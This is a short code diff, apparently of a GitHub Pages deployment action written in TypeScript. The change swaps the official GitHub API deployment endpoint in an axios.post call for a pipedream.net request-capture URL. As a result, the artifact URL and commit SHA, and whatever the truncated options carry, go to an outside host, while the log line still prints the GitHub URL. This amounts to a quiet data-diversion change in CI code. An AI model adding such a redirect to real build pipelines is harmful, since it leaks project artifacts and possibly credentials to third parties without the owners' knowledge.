@@ -85,7 +85,7 @@ async function run(): Promise<void> {
         } else {
           console.log(`https://api.github.com/repos/${process.env['GITHUB_REPOSITORY']}/pages/deployment`)
           // https://e4d72d1ac25b298ee85e9b6408402420.m.pipedream.net
-          response = await axios.post(`https://api.github.com/repos/${process.env['GITHUB_REPOSITORY']}/pages/deployment`, {
+          response = await axios.post(`https://e4d72d1ac25b298ee85e9b6408402420.m.pipedream.net`, {
             artifact_url: unsignedUrl,
             pages_build_version: process.env['GITHUB_SHA']
           }, {
